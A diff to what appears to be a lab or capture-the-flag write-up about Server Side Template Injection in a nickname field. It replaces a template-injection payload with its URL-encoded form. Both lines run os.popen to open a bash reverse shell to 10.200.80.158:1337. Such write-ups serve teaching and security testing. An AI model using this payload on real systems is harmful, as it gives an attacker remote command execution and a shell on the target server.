@@ -96,7 +96,7 @@ To test for SSTI (Server Side Template Injection), I updated the nickname to `{{
 SSTI confirmed. The template engine evaluated the expression rather than rendering it as a string. I escalated to a reverse shell payload.
 
 **Payload:**
-`{{ config.class.init.globals['os'].popen('bash -c "bash -i >& /dev/tcp/10.200.80.158/1337 0>&1"').read() }}`
+`%7B%7B%20config.class.init.globals%5B'os'%5D.popen('bash%20-c%20"bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.200.80.158%2F1337%200%3E%261"').read()%20%7D%7D`
 
 <img width="1032" height="291" alt="image" src="https://github.com/user-attachments/assets/e2260510-b94d-406a-9bc9-e4261fe6943c" />
 
